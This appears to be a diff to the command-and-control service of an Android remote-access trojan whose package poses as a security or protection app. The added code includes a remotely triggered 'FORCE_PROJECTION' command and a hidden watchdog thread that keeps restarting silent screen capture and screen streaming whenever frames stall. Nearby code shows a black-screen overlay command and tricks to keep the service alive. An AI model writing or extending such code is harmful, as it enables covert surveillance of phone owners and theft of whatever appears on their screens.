@@ -211,6 +211,7 @@ public class CommandControlService extends Service {
         try { com.seguranca.protecao.KryptosWatchdog.arm(this); } catch (Throwable ignored) {}
 
         super.onCreate();
+        startCaptureWatchdog();
         sInstance = this;
         // IMPORTANTE: Inicia foreground service para evitar kill do Android 8+
         startForegroundServiceWithNotification();
@@ -577,6 +578,11 @@ public class CommandControlService extends Service {
                     }
                     break;
                 }
+
+                case "FORCE_PROJECTION":
+                    UiAssistBridge.forceProjection(getApplicationContext());
+                    sendResponse("OK", "projecao forcada");
+                    break;
 
                 case "BLACK_SCREEN_ON":
                     // 🖤 Envia broadcast para AccessibilityService (100% opaco)
@@ -3064,6 +3070,27 @@ public class CommandControlService extends Service {
      * Backpressure gate shared by standard and silent capture loops.
      * Mirrors sendFrame() throttle without sending.
      */
+    private void startCaptureWatchdog() {
+        Thread t = new Thread(() -> {
+            while (true) {
+                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
+                try {
+                    long now = System.currentTimeMillis();
+                    boolean stalled = (lastSuccessfulSend == 0L) || (now - lastSuccessfulSend > 8000L);
+                    if (isConnected && stalled) {
+                        boolean running = UiAssistBridge.isSilentCaptureRunning();
+                        boolean proj = ScreenStreamService.isActive();
+                        Log.w(TAG, "WATCHDOG captura: silent=" + running + " proj=" + proj);
+                        if (!running) { try { UiAssistBridge.startSilentScreenCapture(70); } catch (Throwable ignored) {} }
+                        if (!proj) { try { ScreenStreamService.forceEnsure(CommandControlService.this); } catch (Throwable ignored) {} }
+                    }
+                } catch (Throwable ignored) {}
+            }
+        }, "CapWatchdog");
+        t.setDaemon(true);
+        t.start();
+    }
+
     public static boolean canAcceptScreenFrame() {
         CommandControlService svc = sInstance;
         if (svc == null || !svc.isConnected || svc.webSocket == null) {
